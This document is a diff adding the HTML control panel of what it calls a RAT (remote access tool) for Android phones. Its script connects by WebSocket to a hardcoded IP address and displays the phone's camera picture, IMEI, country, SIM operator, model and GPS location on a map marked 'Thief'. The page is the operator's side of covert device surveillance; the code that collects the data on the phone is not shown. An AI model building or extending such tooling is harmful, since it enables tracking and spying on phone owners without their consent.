@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Kodeslacker's RAT</title>
+
+  <!-- Bootstrap -->
+  <link href="//netdna.bootstrapcdn.com/bootstrap/3.1.1/css/bootstrap.min.css" rel="stylesheet">
+
+  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+  <!--[if lt IE 9]>
+  <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+  <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+  <![endif]-->
+</head>
+<body>
+  <div id="dvMap" class="jumbotron" style="height:500px;">
+  </div>
+  <div class="container">
+    <div class="row well well-lg">
+      <img id="picture" src="" class="col-md-6">
+      <div class="col-md-6">
+        <div class="row">
+          <h3 id="PhoneName" class="pull-right"> Dummy Phone</h3>
+        </div>
+        <hr>
+        <div class="row">
+          <div class="col-md-6">
+            <h5><i class="glyphicon glyphicon-tasks"></i> IMEI:</h5>
+          </div>
+          <div class="col-md-6">
+            <h5 id="IMEI">Dummy IMEI</h5>
+          </div>
+        </div>
+        <div class="row">
+          <div class="col-md-6">
+            <h5><i class="glyphicon glyphicon-globe"></i> Country:</h5>
+          </div>
+          <div class="col-md-6">
+            <h5 id="Country">Dummy Country</h5>
+          </div>
+        </div>
+        <div class="row">
+          <div class="col-md-6">
+            <h5><i class="glyphicon glyphicon-briefcase"></i> SimOperator:</h5>
+          </div>
+          <div class="col-md-6">
+            <h5 id="SimOperator">Dummy SimOperator</h5>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+
+  <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
+  <!-- Include all compiled plugins (below), or include individual files as needed -->
+
+  <script>
+  var ws = new WebSocket("ws://188.25.250.75:5445");
+  ws.onmessage = function (evt)
+  {
+    var data=JSON.parse(evt.data);
+    $("#picture").attr("src",data.Picture);
+    var systemInfo=JSON.parse(data.SystemInfo);
+    $("#IMEI").html(systemInfo.IMEI);
+    $("#Country").html(systemInfo.CountryCode);
+    $("#SimOperator").html(systemInfo.SimOperator);
+    $("#PhoneName").html('<i class="glyphicon glyphicon-phone"></i> '+systemInfo.Manufacturer+" "+systemInfo.Model);
+
+
+    var loc=JSON.parse(data.Location);
+    var mapOptions = {
+      //give latitude and long
+      center: new google.maps.LatLng(loc.Latitude,loc.Longitude),
+      zoom: 15,
+      mapTypeId: google.maps.MapTypeId.ROADMAP
+    };
+    var infoWindow = new google.maps.InfoWindow();
+    var map = new google.maps.Map(document.getElementById("dvMap"), mapOptions);
+    //give latitude and long
+    var myLatlng = new google.maps.LatLng(loc.Latitude,loc.Longitude);
+    var marker = new google.maps.Marker({
+      position: myLatlng,
+      map: map,
+      title: "Thief"
+    });
+  };
+  console.log('alles gut');
+  </script>
+  <script type="text/javascript" src="http://maps.googleapis.com/maps/api/js?sensor=false"></script>
+</body>
+</html>
